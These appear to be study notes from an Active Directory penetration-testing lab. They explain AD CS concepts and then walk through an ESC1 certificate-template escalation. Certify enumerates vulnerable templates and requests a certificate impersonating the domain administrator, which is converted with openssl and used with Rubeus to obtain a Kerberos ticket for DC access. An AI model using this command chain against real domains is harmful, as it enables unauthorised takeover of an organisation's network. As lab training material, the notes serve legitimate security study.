- Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.
- AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.
- "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."

- CA - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.
- Certificate - Issued to a user or machine and can be used for authentication, encryption, signing etc.
- CSR - Certificate Signing Request made by a client to the CA to request a certificate.
- Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.
- EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)

![[ADCS.png]]

- We can use the Certify tool (https://github.com/GhostPack/Certify) to enumerate (and for other attacks) AD CS in the target forest:
```
Certify.exe cas
```
- Enumerate the templates.:
```
Certify.exe find
```
- Enumerate vulnerable templates:
```
Certify.exe find /vulnerable
```

- In moneycorp, there are multiple misconfigurations in AD CS.
- Common requirements/misconfigurations for all the Escalations that we have in the lab (ESC1 and ESC3)
	- CA grants normal/low-privileged users enrollment rights
	- Manager approval is disabled
	- Authorization signatures are not required
	- The target template grants normal/low-privileged users enrollment rights

### AD CS - ESC1
- The template "HTTPSCertificates" has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag.
```
Certify.exe find /enrolleeSuppliesSubject
```
- The template "HTTPSCertificates" allows enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx
```
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```
- Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA).
```
openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1.pfx

Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
```
- check if we can access DC
```
winrs -r:dcorp-dc cmd /c set username
```